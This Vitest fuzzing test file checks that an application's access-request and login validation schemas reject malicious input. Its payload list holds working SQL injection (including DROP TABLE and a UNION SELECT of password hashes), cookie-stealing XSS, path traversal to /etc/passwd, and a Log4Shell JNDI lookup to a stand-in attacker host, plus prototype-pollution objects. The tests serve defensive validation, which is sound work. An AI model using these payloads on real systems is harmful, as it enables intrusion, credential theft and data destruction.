import { describe, it, expect } from 'vitest';
import {
  createAccessRequestSchema,
  loginSchema,
  createResourceSchema,
  validateInput,
} from '@/lib/security/validation';

describe('Fuzzing & Malicious Input Validation Tests', () => {
  const MALICIOUS_PAYLOADS = [
    // SQL Injection Vectors
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT null, email, passwordHash FROM users--",
    "admin'--",

    // Cross-Site Scripting (XSS) Vectors
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<body onload=alert('ZTAP')>",

    // Path Traversal
    "../../../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",

    // Buffer Overflows / Memory Stress (10,000 chars)
    'A'.repeat(10000),

    // Null Byte Injection
    "admin\0@example.com",
    "resource-id\0.jpg",

    // Format String / Special Characters
    "%s%s%s%s%s%n",
    "${jndi:ldap://attacker.com/exploit}",
    "{{7*7}}",
    "\u0000\u001f\u007f",
  ];

  it('rejects malicious payloads in the access request reason field', () => {
    for (const payload of MALICIOUS_PAYLOADS) {
      const result = validateInput(createAccessRequestSchema, {
        resourceId: '00000000-0000-0000-0000-000000000001',
        deviceId: '00000000-0000-0000-0000-000000000002',
        reason: payload,
      });

      // Reason field must fail validation for HTML tags, excessive length, or bad characters
      if (payload.includes('<') || payload.length > 500) {
        expect(result.success).toBe(false);
      }
    }
  });

  it('rejects invalid or fuzzed UUIDs in resourceId and deviceId', () => {
    for (const payload of MALICIOUS_PAYLOADS) {
      const result = validateInput(createAccessRequestSchema, {
        resourceId: payload,
        deviceId: payload,
        reason: 'Legitimate business reason for access',
      });

      expect(result.success).toBe(false);
    }
  });

  it('strictly rejects malicious email and password payloads on login', () => {
    for (const payload of MALICIOUS_PAYLOADS) {
      const result = validateInput(loginSchema, {
        email: payload,
        password: payload,
      });

      // Malicious strings are not valid emails or exceed maximum length
      expect(result.success).toBe(false);
    }
  });

  it('safely handles non-object and unexpected prototype pollution types', () => {
    const fuzzedInputs = [
      null,
      undefined,
      12345,
      true,
      [],
      { __proto__: { admin: true } },
      { constructor: { prototype: { isAdmin: true } } },
    ];

    for (const input of fuzzedInputs) {
      const result = validateInput(createAccessRequestSchema, input);
      expect(result.success).toBe(false);
    }
  });
});
